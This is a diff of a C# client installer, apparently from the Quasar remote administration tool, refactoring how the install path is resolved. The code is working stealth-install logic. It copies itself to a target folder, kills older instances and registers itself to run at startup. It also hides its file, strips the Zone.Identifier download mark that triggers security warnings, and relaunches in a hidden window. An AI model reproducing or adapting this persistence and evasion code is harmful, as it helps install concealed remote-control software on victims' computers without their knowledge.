@@ -1,26 +1,25 @@
 ﻿using Quasar.Client.Config;
-using Quasar.Client.Data;
 using Quasar.Common.Helpers;
-using Quasar.Common.Networking;
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Setup
 {
     public class ClientInstaller
     {
-        public void Install(ISender client)
+        public void Install()
         {
             bool isKilled = false;
 
             // create target dir
-            if (!Directory.Exists(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY)))
+            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLPATH)))
             {
                 try
                 {
-                    Directory.CreateDirectory(Path.Combine(Settings.DIRECTORY, Settings.SUBDIRECTORY));
+                    Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLPATH));
                 }
                 catch (Exception)
                 {
@@ -29,11 +28,11 @@ namespace Quasar.Client.Setup
             }
 
             // delete existing file
-            if (File.Exists(ClientData.InstallPath))
+            if (File.Exists(Settings.INSTALLPATH))
             {
                 try
                 {
-                    File.Delete(ClientData.InstallPath);
+                    File.Delete(Settings.INSTALLPATH);
                 }
                 catch (Exception ex)
                 {
@@ -41,7 +40,7 @@ namespace Quasar.Client.Setup
                     {
                         // kill old process if new mutex
                         Process[] foundProcesses =
-                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(ClientData.InstallPath));
+                            Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Settings.INSTALLPATH));
                         int myPid = Process.GetCurrentProcess().Id;
                         foreach (var prc in foundProcesses)
                         {
@@ -58,7 +57,7 @@ namespace Quasar.Client.Setup
             //copy client to target dir
             try
             {
-                File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
+                File.Copy(Application.ExecutablePath, Settings.INSTALLPATH, true);
             }
             catch (Exception)
             {
@@ -67,22 +66,21 @@ namespace Quasar.Client.Setup
 
             if (Settings.STARTUP)
             {
-                if (!Startup.AddToStartup())
-                    ClientData.AddToStartupFailed = true;
+                Startup.AddToStartup();
             }
 
             if (Settings.HIDEFILE)
             {
                 try
                 {
-                    File.SetAttributes(ClientData.InstallPath, FileAttributes.Hidden);
+                    File.SetAttributes(Settings.INSTALLPATH, FileAttributes.Hidden);
                 }
                 catch (Exception)
                 {
                 }
             }
 
-            FileHelper.DeleteZoneIdentifier(ClientData.InstallPath);
+            FileHelper.DeleteZoneIdentifier(Settings.INSTALLPATH);
 
             //start file
             var startInfo = new ProcessStartInfo
@@ -90,7 +88,7 @@ namespace Quasar.Client.Setup
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true,
                 UseShellExecute = false,
-                FileName = ClientData.InstallPath
+                FileName = Settings.INSTALLPATH
             };
             try
             {
